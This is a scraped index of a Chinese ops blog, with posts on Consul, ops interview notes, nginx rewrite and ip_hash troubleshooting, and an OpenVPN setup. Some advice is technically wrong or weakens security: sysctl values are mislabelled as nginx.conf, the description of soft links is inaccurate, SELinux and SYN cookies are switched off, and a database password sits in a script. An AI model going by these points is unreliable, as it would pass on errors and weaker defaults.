client.KV().Keys(\u0026quot;go\u0026quot;, \u0026quot;\u0026quot;, nil) fmt.Println(keys) } 根据此功能专门做一个服务管理的模块，客户端注册服务到服务模块，服务管理去提供其他模块的服务发现的功能，同时跟监控结合，当服务不可用时，或服务不存在时，通过监控通知相关人员，我们也可以使用页面跟我们服务管理结合，通过前台服务录入形式进行注册服务.\n参考\n consul官方网站  ","permalink":"https://www.fenghong.tech/blog/go/consul-register/","tags":["consul","cluster","go"],"title":"consul服务注册"},{"categories":["living"],"contents":"[TOC]\n银基安全 20191015 一、请问对于批量修改配置文件的ip或者某一个字段,如何用shell或者python来写?或者你觉得用什么方式来处理最好.\nshell的话用find + sed 二、1000台虚拟机如何管理系统请问你有思路么?\n这个主要考你的devops, 首先,考虑告警处理, 1000台的问题如果人工运维的话,基本不可以,需要考虑自动化报警处理. 比如搭建监控系统. 系统的配置更新, 比如使用ansible等自动化工具来进行管理. 三、请说lvs,haProxy,nginx,keepalive的区别以及应用场景?\n四、请问,你在公司运维一年多的时间内,碰到的最棘手的问题?(或者是最具有代表性的问题)\n磁盘删除文件的问题, 删除大日志文件, 但是磁盘空间未释放问题 mysql数据库批量更新, 开发同学的一个`update`语句 公司单点系统转向负载均衡高可用的过程 服务器权限隔离,审计等功能的实现 五、请问你了解ittl管理么 (不知道是什么,没听清,it的方法管理论)\n六、kubernetes的备份如何做? (基于命令行备份 ectdctl, ectd存储了k8s集群的所有状态.)\n七、给你一个应用程序,需要部署, 已知并发峰值为100000.请问如何设计.\n数据库层面:不要让其每秒请求支撑超过2000，一般控制在2000左右。就是在上万并发请求的场景下，部署个5台服务器，每台服务器上都部署一个数据库实例。 大量分表的策略保证可能未来10年，每个表的数据量都不会太大，这可以保证单表内的SQL执行效率和性能 nginx网络应用层面, 实际生产环境能到2-3万并发连接数 采用lvs或者Haproxy. 20191016 比格基地 一、docker容器对CPU,内存,磁盘io等资源的控制?\n博客园大佬 写一个程序\nint main(void) { int i = 0; for(;;) i++; return 0; } $ gcc -o hello a.c $ ./hello \u0026amp; $ top top - 23:04:03 up 92 days, 11:49, 4 users, load average: 0.20, 0.94, 0.62 PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 13619 root 20 0 4208 352 276 R 99.9 0.0 2:13.70 hello 对该资源的控制\n# cgroup中对cpu的限制 $ mkdir /sys/fs/cgroup/cpu/hello $ ls cgroup.clone_children cgroup.procs cpuacct.usage cpu.cfs_period_us cpu.rt_period_us cpu.shares notify_on_release cgroup.event_control cpuacct.stat cpuacct.usage_percpu cpu.cfs_quota_us cpu.rt_runtime_us cpu.stat $ cat cpu.cfs_quota_us -1 $ echo 20000 \u0026gt; cpu.cfs_quota_us $ echo 13619 \u0026gt;\u0026gt; tasks $ top top - 23:07:48 up 92 days, 11:53, 4 users, load average: 0.00, 0.44, 0.48 PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 13619 root 20 0 4208 352 276 R 20.3 0.0 2:49.65 hello docker控制cpu,内存,io,是基于cgroup的控制.\n二、磁盘io占满,如何排查是由什么进程占用的\niotop -oP 命令的含义：只显示有I/O行为的进程 pidstat -d 1 命令的含义：展示I/O统计，每秒更新一次 三、文件系统上生成一个文件到落盘的过程\n四、linux的文件系统nfs和ext的区别\n参考知乎大佬\nEXT文件系统： 是固定的inode节点 格式化慢 修复慢 文件系统存储量有限 XFS文件系统： 高容量，大存储 inode与block都是在需要时产生的 nginx的并发优化\n$ cat nginx.conf net.core.somaxconn = 20480 net.core.rmem_default = 262144 net.core.wmem_default = 262144 net.core.rmem_max = 16777216 net.core.wmem_max = 16777216 net.ipv4.tcp_rmem = 4096 4096 16777216 net.ipv4.tcp_wmem = 4096 4096 16777216 net.ipv4.tcp_mem = 786432 2097152 3145728 net.ipv4.tcp_max_syn_backlog = 16384 net.core.netdev_max_backlog = 20000 net.ipv4.tcp_fin_timeout = 15 net.ipv4.tcp_max_syn_backlog = 16384 net.ipv4.tcp_tw_reuse = 1 net.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_max_orphans = 131072 net.ipv4.tcp_syncookies = 0 $ sysctl -p nginx层面 worker_connections 20000; worker_process 1; 五、写出你们公司的现有的架构, 并解释为什么这么构建? (现场演算+讲述)\n六、取出nginx日志的访问前十的ip? (现场演算+讲述)\n七、常用的linux系统工具, 请列举尽可能多的 (现场演算+讲述)\n君学中国 20191026 地址: 裕安大厦17楼 已收offer.\n面试问题: 1. 介绍一下自己 2. 作为一个运维工程师,需要具备哪些特质 3. mysql了解么? 讲一下吧 4. 你还有什么要问我的么 平安普惠 20191105 和初面差不多， 问题一: 最近一份公司干的内容. 我这边从三个方面来讲述：\n 搭建jumpserver堡垒跳板机， 实现权限分离， 安全， 审计功能， 多云环境资产管控。 搭建owncloud客户管理资料共享云盘， 解决数据公布及共享问题。 类似百度云盘 搭建k8s和docker集群测试环境。  问题二： java的容器使用的是什么？ java的一些jvm参数了解么， 可以详细说一下你对jvm的了解， 以及对gc的理解么？这里也深入的问了一下java相关的， 我没有答出来\n回答是使用jetty， java的启动参数如下: JAVA_OPTS=\u0026quot;-Xms2048m -Xmx2048m -XX:PermSize=256M -XX:MaxPermSize=512m\u0026quot; 参数说明： 1.Xms： TOMCAT中JVM内存最小可用内存，此值可以设置与-Xmx相同，以避免每次垃圾回收完成后JVM重新分配内存。 2.Xmx： TOMCAT中JVM内存最大可用内存； 3.-XX:PermSize=256M 设置永久域（非堆内存）的初始值，默认是物理内存的1/64, 建议不要超过256M； 4.-XX:MaxPermSize=512M 设置永久域的最大值，默认是物理内存的1/4，建议修改为512M； 5.-XX:+UseParallelGC： 选择垃圾收集器为并行收集器 问题三: 对DB了解么？(mysql), 那说说mysql的高可用以及mysql的主从复制原理吧. 并追问了mysql的存储引擎\nmaster 起一个线程.\n当从节点连接主节点时，主节点会创建一个log dump 线程，用于发送bin-log的内容。在读取bin-log中的操作时，此线程会对主节点上的bin-log加锁，当读取完成，甚至在发动给从节点之前，锁会被释放。 从节点 起两个线程\n1. I/O 当从节点上执行`start slave`命令之后，从节点会创建一个I/O线程用来连接主节点，请求主库中更新的bin-log。I/O线程接收到主节点binlog dump 进程发来的更新之后，保存在本地relay-log中。 2. SQL线程 SQL线程负责读取`relay log`中的内容，解析成具体的操作并执行，最终保证主从数据的一致性。 问题四. 对Zabbix监控或者openflacon或者promethoues等开源监控了解么? 讲一下吧\n其实面试官可能想知道更深入的, 比如监控分组, 监控哪些内容, 具体如何监控. 我这边主要用的是阿里云的云监控系统, 以前用过zabbix监控, 我就说一下zabbix的监控吧. 首先, 使用agent来进行采集, 采集方式有四种, agent/snmp/IPMI/jmx 监控项主要是对应的应用分组 触发器用来触发一系列的event事件: 界定某特定的item采集到的数据的非合理区间或非合理状态 动作主要来操作恢复事项或者通知, 比如执行一段shell, 发生e-mail等. 问题五. 基于k8s和docker的测试环境, 看你用过k8s, 你讲一下k8s的一些资源概念吧. 追问了一下服务暴露的相关问题.\nk8s的资源概念非常之多, 从最基础的组件 pod, service, deployment, daemonSet, configMap, endpoint, ingress等... 现在大多数的k8s环境, 暴露方式都是 ingress+clusterIP, clusterIP主要是内部的服务直接相互通信使用, 当然也有公司采用LoadBalancer方式(比如阿里云集群或者uk8s集群), 当然比较好用的是ingress的方式. ingress是整个流量的注入口, 后端有个 ingress controller来进行分发至 service服务, 再有service调度至pod, 完成整个访问. 时代天使 20191112 1.ansible的使用的协议是什么? 你经常用到哪些模块?\nansible 默认使用ssh协议! 常用的模块有: copy template shell playbook 2.ln -s和 ln和cp的区别\nln a b 硬链接: 硬链接实际上是为文件建一个别名， 链接文件和原文件实际上是同一个文件.可以通过ls -i来查看一下， 这两个文件的inode号是同一个，说明它们是同一个文件. ln -sv a b 通过软链接建立的链接文件与原文件并不是同一个文件， 相当于原文件的快捷方式。具体理解的话，链接文件内存储的是原文件的inode， 也就是说是用来指向原文件文件，这两个文件的inode是不一样的. cp a b 相当于将原文件进行一个拷贝，为另一个全新的文件，与原文件没有关系了 各自的特点\n硬链接的特点是这样的： 它会在链接文件处创建一个和被链接文件一样大小的文件，类似于国外网站和国内镜像的关系， 硬链接占用的空间和被链接文件一样大（其实就是同一片空间） 修改链接文件和被链接文件中的其中一个，另外一个随之同样发生变化 硬链接的对象不能是目录，也就是说被链接文件不能为目录 硬链接的两个文件是独立的两个引用计数文件，他们共用同一份数据，所以他们- 的inode节点相同 删除硬链接中的任意一个文件，另外一个文件不会被删除。没有任何影响，链接文件一样可以访问，内容和被链接文件一模一样。 软链接的特点： 软连接的链接文件就是一个基本单元大小的文件，一般为3B，和被链接文件的大小没有关系 软链接的链接文件中存储的是被链接文件的元信息，路径或者inode节点 软连接的连接文件是一个独立的文件，有自己的元信息和inode节点 删除软链接的链接文件，被链接文件不会受到任何影响 删除软链接的被链接文件，链接文件会变成红色，这时打开链接文件会报错，报找不到被链接的文件这种错误 软链接可以链接任何类型的文件，包括目录和设备文件都可以作为被链接的对象 复制的特点： 复制产生的文件是一个独立的文件，有自己的元信息和inode节点 删除或修改复制文件，对原文件不会产生任何影响，反过来也是一样的 复制可以复制文件，也可以复制目录 3.取日志里面的ip\n$ grep -E -o \u0026#34;[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+\u0026#34; /etc/hosts 4.dokcerfile的add和copy区别，cmd和endpoint区别. (韵达已经回答了前者)\n# CMD 指令指定容器启动时需要运行的程序,给出的是一个容器的默认的可执行体。# 也就是容器启动以后，默认的执行的命令. CMD [\u0026#34;/bin/bash\u0026#34;] # ENTRYPOINT entrypoint才是正统地用于定义容器启动以后的执行体的，# 其实我们从名字也可以理解，这个是容器的“入口”.ENTRYPOINT [\u0026#34;echo\u0026#34;] CMD [\u0026#34;test cmd\u0026#34;] # 将cmd的参数传递给entrypoint. 总结\n一般还是会用entrypoint的中括号形式作为docker 容器启动以后的默认执行命令, 里面放的是不变的部分，可变部分比如命令参数可以使用cmd的形式提供默认版本， 也就是run里面没有任何参数时使用的默认参数。如果我们想用默认参数，就直接run， 否则想用其他参数，就run 里面加参数. 5.k8s里面的replicaset和daemonset的区别。\nreplicaSet\nKubernetes 中的 ReplicaSet 主要的作用是维持一组 Pod 副本的运行， 它的主要作用就是保证一定数量的 Pod 能够在集群中正常运行， 它会持续监听这些 Pod 的运行状态，在 Pod 发生故障重启数量减少时重新运行新的 Pod 副本。 原理: 所有 ReplicaSet 对象的增删改查都是由 ReplicaSetController 控制器完成的， 该控制器会通过 Informer 监听 ReplicaSet 和 Pod 的变更事件并将其加入持有的待处理队列. ReplicaSetController 中的 queue 其实就是一个存储待处理 ReplicaSet 的『对象池』， 它运行的几个 Goroutine 会从队列中取出最新的数据进行处理 DaemonSet\nDaemonSet 可以保证集群中所有的或者部分的节点都能够运行同一份 Pod 副本， 每当有新的节点被加入到集群时，Pod 就会在目标的节点上启动，如果节点被从集群中剔除， 节点上的 Pod 也会被垃圾收集器清除 原理: 所有的 DaemonSet 都是由控制器负责管理的，与其他的资源一样， 用于管理 DaemonSet 的控制器是 DaemonSetsController， 该控制器会监听 DaemonSet、ControllerRevision、Pod 和 Node 资源的变动 大多数的触发事件最终都会将一个待处理的 DaemonSet 资源入栈， 下游 DaemonSetsController 持有的多个工作协程就会从队列里面取出资源进行消费和同步。 6.k8s里面服务是怎么暴露的\n现在大多数的k8s环境, 暴露方式都是 ingress+clusterIP, clusterIP主要是内部的服务直接相互通信使用, 当然也有公司采用LoadBalancer方式 (比如阿里云集群或者uk8s集群), 当然比较好用的是ingress的方式. ingress是整个流量的注入口, 后端有个 ingress controller来进行分发至 service服务, 再有service调度至pod, 完成整个访问的链路. 7.mysql如何备份。\n#!/bin/sh # mysql data backup script # # use mysqldump --help,get more detail. # BakDir=/data/mysql LogFile=/data/mysql/mysqlbak.log DATE=`date +%Y%m%d_%H%M%S` [ -z $1 ] \u0026amp;\u0026amp; exit database=$1 echo \u0026#34; \u0026#34; \u0026gt;\u0026gt; $LogFile echo \u0026#34; \u0026#34; \u0026gt;\u0026gt; $LogFile echo \u0026#34;--------------------------\u0026#34; \u0026gt;\u0026gt; $LogFile echo $(date +\u0026#34;%y-%m-%d %H:%M:%S\u0026#34;) \u0026gt;\u0026gt; $LogFile echo \u0026#34;--------------------------\u0026#34; \u0026gt;\u0026gt; $LogFile cd $BakDir/${database} GZDumpFile=${database}-$DATE.sql.gz /usr/bin/mysqldump -ubak -h\u0026#39;localhost\u0026#39; -p\u0026#39;password\u0026#39; --databases $database |gzip \u0026gt; $GZDumpFile echo \u0026#34;Dump Done\u0026#34; \u0026gt;\u0026gt; $LogFile echo \u0026#34;[$GZDumpFile]Backup Success.\u0026#34; \u0026gt;\u0026gt; $LogFile find $BakDir/${database} -ctime +300 -exec rm {} \\; 8.线上日志如何备份.\n#!/bin/bash #显示上个月的时间如201808 last_one_month=$(date +%Y%m --date=\u0026#34;-1 month\u0026#34;) #last_two_month=$(date +%Y%m --date=\u0026#34;-2 month\u0026#34;) logdir=/udisk/logs/ gzdir=/udisk/gz/logs #nginx_backup cd ${logdir} ## delete logs file before 1 month ago ## find ${logdir}/ -mtime +35 -exec rm -f {} \\; ## tar project logs ## tar zcf activity.${last_one_month}.tar.gz activity tar zcf nginx.${last_one_month}.tar.gz nginx tar zcf cms.${last_one_month}.tar.gz cms tar zcf cron.${last_one_month}.tar.gz cron tar zcf borrow.${last_one_month}.tar.gz borrow tar zcf manage.${last_one_month}.tar.gz manage tar zcf borrowWap.${last_one_month}.tar.gz borrowWap tar zcf rms.${last_one_month}.tar.gz rms tar zcf wap.${last_one_month}.tar.gz wap tar zcf www.${last_one_month}.tar.gz www tar zcf www2.${last_one_month}.tar.gz www2 ## move the tar.gz file ## mv *.gz ${gzdir} ## backup everyday ## cd ${logdir}/mobile for file in ./* ; do tar zcf ${file}.tar.gz ${file} mv ${file}.tar.gz ${gzdir} done 9.sql某个字段有索引，为什么执行了explain却发现没用到索引？\n-- 1.like查询中，使用%  -- 2.隐式转换导致不走索引。  SELECT * FROM T WHERE Y = 5 -- 但是Y列是VARCHAR, 编译器会存在一个隐式的转换  SELECT * FROM T WHERE Y = \u0026#39;5\u0026#39; -- 3.索引列上有函数运算，导致不走索引  SELECT * FROM T WHERE FUN(Y) = XXX -- 4. ！=或者\u0026lt;\u0026gt;(不等于），可能导致不走索引，也可能走 INDEX FAST FULL SCAN  select id from test where id\u0026lt;\u0026gt;100 -- 5. 查询谓词没有使用索引的主要边界,换句话说就是select *，可能会导致不走索引。  SELECT * FROM T WHERE Y=XXX -- 假如你的T表上有一个包含Y值的组合索引，但是优化器会认为需要一行行的扫描会更有效 -- 6. 条件为not in ,not exist  ... 10.如果让你来管理2000台虚拟机, 你应该如何管理?(银基安全已经出了这个题目)\n这个主要考你的devops, 首先,考虑告警处理; 2000台的问题如果人工运维的话,基本不可能实现, 需要考虑自动化报警处理. 比如搭建监控系统zabbix, 系统的配置批量更新, 比如使用ansible等自动化工具来进行管理. 11.arp协议原理,请讲述一下\n# 计算机中会维护一个ARP缓存表，这个表记录着IP地址与MAC地址的映射关系; # 查看arp记录表可以用如下命令: $ arp -a # 在以太网中，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。 # 但这个目标MAC地址是如何获得的呢？ 它就是通过地址解析协议获得的。 # 所谓“地址解析”就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。 # ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。 # ARP协议的主要工作就是建立、查询、更新、删除ARP表项。 ","permalink":"https://www.fenghong.tech/blog/living/interview/","tags":["interview"],"title":"2019年面试"},{"categories":["server","nginx"],"contents":"[TOC]\nlast 和 break 当出现在location 之外时，两者的作用是一致的没有任何差异\n 出现在location内部时.\nbreak和last都能阻止继续执行后面的rewrite指令，last如果在location下的话，对于重写后的URI会重新匹配location，而break不会重新匹配location。\n 具体\n last：停止当前这个请求，并根据rewrite匹配的规则重新发起一个请求。新请求又从第一阶段开始执行…\nbreak：相对last，break并不会重新发起一个请求，只是跳过当前的rewrite阶段，并执行本请求location后续的执行阶段\n 为了测试方便,添加了nginx的echo模块, 测试环境重装了一下nginx. 如果是已经安装的nginx, 建议查看这篇在已经安装Nginx的基础上增加新Nginx-echo模块\n$ wget https://github.com/openresty/echo-nginx-module/archive/v0.61.tar.gz $ tar xf v0.61.tar.gz $ cd echo-nginx-module-0.61/ $ pwd /data/echo-nginx-module-0.61/ $ wget https://nginx.org/download/nginx-1.16.1.tar.gz $ tar xf nginx-1.16.1.tar.gz \u0026amp;\u0026amp; cd nginx-1.16.1 $ ./configure --prefix=/etc/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --user=nginx --group=nginx \\ --add-module=/data/echo-nginx-module-0.61 \\ --with-http_ssl_module \\ --with-http_realip_module $ make -j4 \u0026amp;\u0026amp; make install 添加一个test.conf文件\nserver { listen 80; server_name ii.com; location /break/ { rewrite ^/break/(.*) /test/$1 break; echo \u0026quot;break page\u0026quot;; echo \u0026quot;break1 page\u0026quot;; } location /last/ { rewrite ^/last/(.*) /test/$1 last; echo \u0026quot;last page\u0026quot;; } location /test/ { echo \u0026quot;test page\u0026quot;; } } 测试\n$ curl ii.com/break/a break page break1 page $ curl ii.com/test/a test page $ curl ii.com/last/a test page 分析\n break是跳过当前请求的rewrite阶段, 继续执行本请求的其他阶段,即echo阶段.\nlast与break最大的不同是，last会重新发起一个新请求，并重新匹配location，所以对于/last,重新匹配请求以后会匹配到/test/,所以最终对应的content阶段的输出是test page;\n 有个优先级的判断, ^~ / 与/api, 直接访问/api/会执行第二个location. 添加另外一个test2.conf\nserver { listen 80; server_name i.com; index index.html index.php index.htm index.jsp index.do default.do; location ^~ / { rewrite ^\\/(.*)$ /$1 break; echo 'test ^~ /'; } location /api/ { rewrite ^\\/api/(.*)$ /$1 break; echo 'test /api/'; } } 测试\n$ curl i.com/ test ^~ / $ curl i.com/api/a test /api/ 分析\n rewrite规则, 应该是全局扫描, 匹配则执行rewrite语句.\n ","permalink":"https://www.fenghong.tech/blog/ops/nginx-rewrite/","tags":["nginx"],"title":"nginx rewrite的break和last"},{"categories":["server","nginx"],"contents":"nginx基于ip_hash访问策略的不生效的分析.\n 一大早上, 开发过来和我说, nginx的负载均衡是不是不生效了, 后端的日志大小不一样, 相差甚大. 想了想, 访问量在非常大的情况下, 这些日志里的大小应该相对平均. 因此上服务器具体查看相关信息.\n 查日志,定位 查看相关的日志量, 来进行定位.\n$ ansible yj-new -m shell -a \u0026#34;du -sh /usr/local/e-mall/logs\u0026#34; 172.16.111.140 | CHANGED | rc=0 \u0026gt;\u0026gt; 486M\t/usr/local/e-mall/logs 172.16.111.142 | CHANGED | rc=0 \u0026gt;\u0026gt; 189M\t/usr/local/e-mall/logs 172.16.111.143 | CHANGED | rc=0 \u0026gt;\u0026gt; 1.6M\t/usr/local/e-mall/logs 172.16.111.141 | CHANGED | rc=0 \u0026gt;\u0026gt; 562M\t/usr/local/e-mall/logs 查看配置文件, 发现nginx的负载均衡策略为ip_hash\nnginx中配置的是ip-hash算法来负载,remote_addr为具体的某个ip时, 负载至后端是固定的。初步断定是由于remote_addr为某些固定ip原因造成 .\n分析了两台web的nginx访问ip次数. 亮瞎了我的眼, 日志总共260W＋,访问的ip却只有600+. 那的确可能是remote_addr存在相关的问题. 日活大概在500W的PV. UV绝对不止600+; 因为服务器前端有CDN/SLB, 获取的remote_addr部分是client_real_ip, 不具有代表性.\n$ wc -l /usr/local/nginx/log/emall.access.log 2661917 /usr/local/nginx/log/emall.access.log $ awk '{print $1}' emall.access.log |sort -n |uniq -c| wc -l 659 $ awk '{print $1}' emall.access.log |sort -n |uniq -c| wc -l 664 查询具体的ip及次数并重定向只文件中, 分析ip来源.\n$ awk '{print $1}' emall.access.log |sort -n|uniq -c|sort -nr|head -100 47754 120.27.74.189 43620 120.27.74.159 38094 120.27.74.157 37226 120.27.74.180 31201 120.27.74.174 29928 222.186.49.162 29491 14.17.67.49 29257 222.186.49.191 28835 14.17.67.28 28188 222.186.49.150 27456 120.27.74.154 26047 222.186.49.194 25379 120.27.74.181 25081 116.211.216.219 23177 116.211.216.193 21665 222.186.49.160 21449 120.27.74.169 20319 116.211.216.202 .... 对结果的ip进行分析, 使用curl工具, 对ip进行分析, 使用的是lionsoul/ip2region来查询的ip信息.基本都是阿里云的ISP,,电信机房, 移动机房.\n$ awk \u0026#34;{print $2}\u0026#34; ip.txt | while read ip ; do curl -H \u0026#34;DEVOPS-API-TOKEN: ${louis_token}\u0026#34; https://api.wangke.co/api/v1/queryip?ip=$ip \u0026gt;\u0026gt; ip.md ;echo \u0026#34;\\n\u0026#34; \u0026gt;\u0026gt; ip.md ; done $ cat ip.md {\u0026#34;data\u0026#34;:{\u0026#34;ip\u0026#34;:\u0026#34;120.27.74.189\u0026#34;,\u0026#34;ipInfo\u0026#34;:{\u0026#34;CityId\u0026#34;:0,\u0026#34;Country\u0026#34;:\u0026#34;中国\u0026#34;,\u0026#34;Region\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Province\u0026#34;:\u0026#34;山东\u0026#34;,\u0026#34;City\u0026#34;:\u0026#34;青岛\u0026#34;,\u0026#34;ISP\u0026#34;:\u0026#34;阿里云\u0026#34;}},\u0026#34;entryType\u0026#34;:\u0026#34;Query IP\u0026#34;,\u0026#34;errmsg\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;requestId\u0026#34;:\u0026#34;b0ff1d40-a487-4613-ac82-e9922d8dd8f8\u0026#34;,\u0026#34;statuscode\u0026#34;:0}\\n {\u0026#34;data\u0026#34;:{\u0026#34;ip\u0026#34;:\u0026#34;120.27.74.159\u0026#34;,\u0026#34;ipInfo\u0026#34;:{\u0026#34;CityId\u0026#34;:0,\u0026#34;Country\u0026#34;:\u0026#34;中国\u0026#34;,\u0026#34;Region\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Province\u0026#34;:\u0026#34;山东\u0026#34;,\u0026#34;City\u0026#34;:\u0026#34;青岛\u0026#34;,\u0026#34;ISP\u0026#34;:\u0026#34;阿里云\u0026#34;}},\u0026#34;entryType\u0026#34;:\u0026#34;Query IP\u0026#34;,\u0026#34;errmsg\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;requestId\u0026#34;:\u0026#34;f3ba9b71-ee85-4a6e-aa50-9fd689e49d0b\u0026#34;,\u0026#34;statuscode\u0026#34;:0}\\n {\u0026#34;data\u0026#34;:{\u0026#34;ip\u0026#34;:\u0026#34;120.27.74.180\u0026#34;,\u0026#34;ipInfo\u0026#34;:{\u0026#34;CityId\u0026#34;:0,\u0026#34;Country\u0026#34;:\u0026#34;中国\u0026#34;,\u0026#34;Region\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Province\u0026#34;:\u0026#34;山东\u0026#34;,\u0026#34;City\u0026#34;:\u0026#34;青岛\u0026#34;,\u0026#34;ISP\u0026#34;:\u0026#34;阿里云\u0026#34;}},\u0026#34;entryType\u0026#34;:\u0026#34;Query IP\u0026#34;,\u0026#34;errmsg\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;requestId\u0026#34;:\u0026#34;d9901ab2-863c-4d23-bb94-89221859e15c\u0026#34;,\u0026#34;statuscode\u0026#34;:0}\\n {\u0026#34;data\u0026#34;:{\u0026#34;ip\u0026#34;:\u0026#34;120.27.74.157\u0026#34;,\u0026#34;ipInfo\u0026#34;:{\u0026#34;CityId\u0026#34;:0,\u0026#34;Country\u0026#34;:\u0026#34;中国\u0026#34;,\u0026#34;Region\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Province\u0026#34;:\u0026#34;山东\u0026#34;,\u0026#34;City\u0026#34;:\u0026#34;青岛\u0026#34;,\u0026#34;ISP\u0026#34;:\u0026#34;阿里云\u0026#34;}},\u0026#34;entryType\u0026#34;:\u0026#34;Query IP\u0026#34;,\u0026#34;errmsg\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;requestId\u0026#34;:\u0026#34;471f45ba-0792-4462-9a61-4e818c64ab6d\u0026#34;,\u0026#34;statuscode\u0026#34;:0}\\n {\u0026#34;data\u0026#34;:{\u0026#34;ip\u0026#34;:\u0026#34;14.17.67.49\u0026#34;,\u0026#34;ipInfo\u0026#34;:{\u0026#34;CityId\u0026#34;:0,\u0026#34;Country\u0026#34;:\u0026#34;中国\u0026#34;,\u0026#34;Region\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Province\u0026#34;:\u0026#34;广东\u0026#34;,\u0026#34;City\u0026#34;:\u0026#34;东莞\u0026#34;,\u0026#34;ISP\u0026#34;:\u0026#34;电信\u0026#34;}},\u0026#34;entryType\u0026#34;:\u0026#34;Query IP\u0026#34;,\u0026#34;errmsg\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;requestId\u0026#34;:\u0026#34;2c62a280-4ff0-428e-b058-e1085940d1a4\u0026#34;,\u0026#34;statuscode\u0026#34;:0}\\n {\u0026#34;data\u0026#34;:{\u0026#34;ip\u0026#34;:\u0026#34;222.186.49.191\u0026#34;,\u0026#34;ipInfo\u0026#34;:{\u0026#34;CityId\u0026#34;:1111,\u0026#34;Country\u0026#34;:\u0026#34;中国\u0026#34;,\u0026#34;Region\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Province\u0026#34;:\u0026#34;江苏省\u0026#34;,\u0026#34;City\u0026#34;:\u0026#34;镇江市\u0026#34;,\u0026#34;ISP\u0026#34;:\u0026#34;电信\u0026#34;}},\u0026#34;entryType\u0026#34;:\u0026#34;Query IP\u0026#34;,\u0026#34;errmsg\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;requestId\u0026#34;:\u0026#34;7c802b1c-5526-49e7-b4b5-2800fd422857\u0026#34;,\u0026#34;statuscode\u0026#34;:0}\\n {\u0026#34;data\u0026#34;:{\u0026#34;ip\u0026#34;:\u0026#34;14.17.67.28\u0026#34;,\u0026#34;ipInfo\u0026#34;:{\u0026#34;CityId\u0026#34;:0,\u0026#34;Country\u0026#34;:\u0026#34;中国\u0026#34;,\u0026#34;Region\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;Province\u0026#34;:\u0026#34;广东\u0026#34;,\u0026#34;City\u0026#34;:\u0026#34;东莞\u0026#34;,\u0026#34;ISP\u0026#34;:\u0026#34;电信\u0026#34;}},\u0026#34;entryType\u0026#34;:\u0026#34;Query IP\u0026#34;,\u0026#34;errmsg\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;requestId\u0026#34;:\u0026#34;019ce261-621d-4609-a744-e624aeb1293a\u0026#34;,\u0026#34;statuscode\u0026#34;:0}\\n .... 解决 和开发沟通, 基于session不丢失问题, 采用ip_hash是相对稳定的方法, 但是session目前是存在redis里面, 因此可以将nginx的分发策略改为rr或者wrr.\n对应nginx不是最前端时，如果前端做了CDN/SLB等二次代理的，造成remote_addr为固定ip时可以采用下列方式\n## 写在http模块中, 获取代理的  map $http_x_forwarded_for $clientRealIp { \u0026#34;\u0026#34; $remote_addr; ~^(?P\u0026lt;firstAddr\u0026gt;[0-9\\.]+),?.*$ $firstAddr; } ## upstream模块中的ip_hash改成 hash $clientRealIp  upstream mall { hash $clientRealIp; server 172.16.111.121:8888 max_fails=2 fail_timeout=30s; server 172.16.111.132:8888 max_fails=2 fail_timeout=30s; server 172.16.111.140:8888 max_fails=2 fail_timeout=30s; server 172.16.111.141:8888 max_fails=2 fail_timeout=30s; server 172.16.111.142:8888 max_fails=2 fail_timeout=30s; server 172.16.111.143:8888 max_fails=2 fail_timeout=30s; } 即可.\n","permalink":"https://www.fenghong.tech/blog/ops/nginx-ip_hash-realip/","tags":["nginx","hash","upstream"],"title":"nginx基于ip_hash访问策略的不生效的分析."},{"categories":["ops","iptables"],"contents":" 背景: 公司内网繁多, 每个部门的权限不一样, 可以查看的内网等级也不一样. 因此需要在vpn上做权限分离, 实现租户隔离. 方法是采用iptables的SNAT来实现权限控制. 具体如下:\n $表示bash shell, #表示注释, \u0026gt; 表示数据库\n安装前准备 1、配置阿里云 YUM 镜像\n$ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo $ wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo $ yum clean all $ yum makecache 2、配置时间同步\n$ yum -y install ntpdate $ ntpdate ntp.aliyun.com 3、关闭 SELinux\n$ vim /etc/sysconfig/selinux SELINUX=disabled 4、 开启内核转发\n$ echo net.ipv4.ip_forward = 1 \u0026gt;\u0026gt; /etc/sysctl.conf $ systcl -p ## 生效 安装 OpenVPN $ yum -y install openssh-server lzo openssl openssl-devel openvpn \\ NetworkManager-openvpn openvpn-auth-ldap zip unzip easy-rsa iptables-services 创建证书变量 修改下面字段命令，然后保存退出\n$ cd /etc/openvpn $ ln -sv /usr/share/easy-rsa /etc/openvpn/easy-rsa $ cd /etc/openvpn/easy-rsa/3/ $ vim vars set_var EASYRSA_REQ_COUNTRY \u0026#34;CN\u0026#34; ##国家 set_var EASYRSA_REQ_PROVINCE \u0026#34;BeiJing\u0026#34; ##省份 set_var EASYRSA_REQ_CITY \u0026#34;BeiJing\u0026#34; ##城市 set_var EASYRSA_REQ_ORG \u0026#34;opsbj\u0026#34; ##组织名称自定义 set_var EASYRSA_REQ_EMAIL \u0026#34;510749025@qq.com\u0026#34; ##邮箱 set_var EASYRSA_REQ_OU \u0026#34;Dynamic Times\u0026#34; 创建证书 建议生产环境的增加ca证书的密码.\n$ cd /etc/openvpn/easy-rsa/3/ ## 初始化 $ ./easyrsa init-pki ## 创建根证书, 建议生产环境带密码 $ ./easyrsa build-ca nopass ## 签发服务端证书 $ ./easyrsa build-server-full server nopass # 创建 Diffie-Hellman，确保 key 